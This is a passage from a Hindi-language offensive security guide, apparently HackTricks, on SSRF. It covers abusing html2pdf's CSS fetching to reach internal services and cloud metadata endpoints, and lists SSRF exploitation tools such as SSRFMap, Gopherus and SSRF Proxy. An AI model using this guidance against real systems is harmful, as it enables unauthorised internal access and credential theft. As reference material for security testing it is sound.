- html2pdf TCPDF के `<img>` व्यवहार को कॉपी करता है और `Css::extractStyle()` के अंदर CSS fetching जोड़ता है, जो shallow scheme check के बाद बस `file_get_contents($href)` कॉल करता है। इसे loopback services, RFC1918 ranges, या cloud metadata endpoints को हिट करने के लिए abuse करें।
- इस SSRF primitive को [HTML-to-PDF path traversal tricks](../file-inclusion/README.md#html-to-pdf-svgimg-path-traversal) के साथ combine करें ताकि आप internal HTTP responses और local files जो PDF में render हुए हैं, दोनों को leak कर सकें।

Hardeners को rendering से पहले external URLs को strip करना चाहिए या renderer को network sandbox में isolate करना चाहिए; तब तक PDF generators को blind SSRF proxies की तरह मानें।

## Cloud SSRF शोषण

यदि आप किसी मशीन में जो क्लाउड environment के अंदर चल रही है SSRF vulnerability पाते हैं, तो आप क्लाउड environment के बारे में रोचक जानकारी और यहां तक कि credentials भी प्राप्त कर सकते हैं:


{{#ref}}
cloud-ssrf.md
{{#endref}}

## SSRF संवेदनशील प्लेटफ़ॉर्म

कई ज्ञात प्लेटफ़ॉर्म में SSRF vulnerabilities हैं या थीं, इन्हें देखें:


{{#ref}}
ssrf-vulnerable-platforms.md
{{#endref}}

## उपकरण

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

SSRF vulnerabilities का पता लगाने और exploit करने के लिए टूल

### [Gopherus](https://github.com/tarunkant/Gopherus)

- [Blog post on Gopherus](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

यह टूल निम्न के लिए Gopher payloads जनरेट करता है:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- Zabbix
- Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

- [Blog post on SSRF usage](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_ एक _Java RMI_ vulnerability scanner है जो सबसे सामान्य _Java RMI_ vulnerabilities के लिए attack operations का समर्थन करता है। उपलब्ध अधिकांश operations `--ssrf` विकल्प का समर्थन करते हैं, ताकि अनुरोधित operation के लिए एक _SSRF_ payload जनरेट किया जा सके। `--gopher` विकल्प के साथ, तैयार उपयोग के लिए _gopher_ payloads सीधे जनरेट किए जा सकते हैं।

### [SSRF Proxy](https://github.com/bcoles/ssrf_proxy)

SSRF Proxy एक multi-threaded HTTP proxy server है, जिसे ऐसे HTTP servers के माध्यम से client HTTP ट्रैफ़िक को tunnel करने के लिए डिज़ाइन किया गया है जो Server-Side Request Forgery (SSRF) के लिए vulnerable हों।

### अभ्यास के लिए


{{#ref}}
https://github.com/incredibleindishell/SSRF_Vulnerable_Lab
{{#endref}}

## संदर्भ

- [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4](https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/](https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [Tenable – SSRF Vulnerability in Java TLS Handshakes That Creates DoS Risk](https://www.tenable.com/blog/tenable-discovers-ssrf-vulnerability-in-java-tls-handshakes-that-creates-dos-risk)
- [RFC 5280 §4.2.2.1 Authority Information Access](https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.2.1)

{{#include ../../banners/hacktricks-training.md}}
